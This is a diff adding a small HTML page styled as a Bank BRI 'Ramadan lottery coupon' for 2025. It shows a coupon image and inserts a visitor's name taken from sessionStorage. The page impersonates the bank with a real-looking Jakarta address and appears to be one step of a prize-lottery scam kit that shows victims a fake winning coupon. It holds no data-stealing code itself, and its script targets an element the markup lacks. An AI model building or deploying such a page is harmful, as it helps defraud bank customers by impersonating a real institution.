@@ -1,0 +1,92 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1"> 
+    <meta content="#0F78CB" name="theme-color">
+<!-- Warna untuk Windows Phone -->
+    <meta content="#0F78CB" name="msapplication-navbutton-color">
+    
+    <meta property="og:image:type" content="image/jpeg">
+   <meta property="og:image" content="images/vNVe3160Bnk.jpg">
+    <meta property="og:image" content="images/vNVe3160Bnk.jpg">
+    <meta name="twitter:image" content="https://i.imghippo.com/files/vNVe3160Bnk.jpg">
+    <meta name="description" content="Jl. Jenderal Sudirman Kav.44-46, Jakarta">
+    <title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 𝙍𝙖𝙢𝙖𝙙𝙝𝙖𝙣 | 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 𝟮𝟬𝟮𝟱</title>
+
+    <link rel="stylesheet" href="css/index.css" type="text/css" media="all">
+  <style type="text/css" media="all">
+  body{
+      padding: 0;
+      margin: 0;
+      font-family: Sans-Serif;
+      overflow: scroll;
+      width: 100%;
+      height: 100%;
+      max-width: 600px;
+      max-height: 1000px;
+      position: absolute;
+      transform: translate(-50%,-50%);
+      left: 50%;
+      top: 50%;
+  }
+      
+      .bg{
+          position: relative;
+      }
+      
+      
+      .bok-user{
+          background-color: transparent;
+          width: 200px;
+          position: absolute;
+          transform: translateY(-50%);
+          left: 10%;
+          top: 58%;
+          font-size: 18px;
+          font-weight: bold;
+          color: #fff;
+          z-index: 99;
+      }
+      
+      .thisUser-box{
+          position: relative;
+          
+      }
+      
+      .box-kupon{
+          width: 100%;
+          height: 100%;
+          background-color: transparent;
+          position: absolute;
+          transform: translate(-50%,-50%);
+          left: 50%;
+          top: 50%;
+          z-index: 9999;
+      }
+      
+      .box-kupon img{
+          width: 100%;
+          height: auto;
+          position: relative;
+          transform: translate(-50%,-50%);
+          left: 50%;
+          top: 52.9%;
+          z-index: 9;
+      }
+     
+  </style></head>
+  
+  <body>
+    <main>
+        <img class="bg" width="100%" height="100%" src="puki.jpg" alt="">
+    </main>
+  
+  
+    <script src="js/jquery-3.5.1.min.js"></script>
+    
+    
+    <script>
+    var set_item = sessionStorage.getItem("namamu");
+    document.getElementById("thisUser").innerHTML = set_item;
+    </script>
+
+</body></html>
